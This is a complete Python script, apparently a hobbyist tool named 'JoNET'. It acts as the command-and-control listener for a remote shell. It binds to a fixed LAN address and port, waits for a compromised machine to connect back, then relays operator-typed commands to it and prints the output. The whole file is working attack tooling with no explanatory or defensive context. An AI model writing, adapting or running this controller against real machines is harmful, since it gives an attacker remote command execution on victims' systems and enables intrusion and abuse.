import socket
import os
import sys


def CreateSocket():
	try:	
		global host
		global port
		global s
		s=socket.socket()
		host='192.168.0.106'
		port=9999

	except socket.error as msg:
		print("Error in Creating Socket:", str(msg))

def BindToClient():
	try:
		global host
		global port
		global s
		print("Scouting for systems... \nPort:", port)
		s.bind((host,port))
		s.listen(5)
	except socket.error as msg:
		print("Error in Binding:\n",str(msg),"\nretrying...")
		BindToClient()

def AcceptSocket():
	connection, address = s.accept()
	print("Connected |" + "IP " + str(address[0]) + " | Port " + str(address[1]))
	sendCommands(connection)
	connection.close()

def sendCommands(connection):
	while(True):
		command=input(">")
		if(command.lower()=="quit"):
			connection.close()
			s.close()
			sys.exit()
		if(len(str.encode(command))>0):
			connection.send(str.encode(command))
			response = str(connection.recv(4096),"utf-8")
			print(response, end = "")

def JoNET():
	CreateSocket()
	BindToClient()
	AcceptSocket()

JoNET()



